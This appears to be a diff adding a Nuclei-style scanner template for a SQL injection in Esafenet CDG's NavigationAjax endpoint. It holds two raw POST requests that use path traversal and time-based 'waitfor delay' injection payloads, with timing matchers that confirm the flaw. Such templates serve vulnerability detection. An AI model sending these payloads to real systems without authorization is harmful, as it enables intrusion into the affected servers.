@@ -1,0 +1,37 @@
+id: esafenet-navigationajax-sqli
+
+info:
+  name: Esafenet CDG NavigationAjax - SQL Injection
+  author: qwtd
+  severity: critical
+  description: |
+    Esafenet CDG NavigationAjax contains a SQL injection vulnerability.
+  reference:
+    - https://mp.weixin.qq.com/s/2V1Jj5GMifzg1VwM05axOg
+  tags: 亿赛通-电子文档安全管理系统
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/js/../NavigationAjax HTTP/1.1
+        Host: your-ipUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        command=nav&id=1'waitfor delay '0:0:3'--+&name=&openId=
+
+      - |
+        POST /CDGServer3/js/../NavigationAjax HTTP/1.1
+        Host: your-ipUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        command=nav&id=1'waitfor delay '0:0:5'--+&name=&openId=
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration_1>=3 && duration_1<=5"
+          - "duration_2>=5 && duration_2<=8"
+          - "status_code_1==200"
+          - "status_code_2==200"
+        condition: and
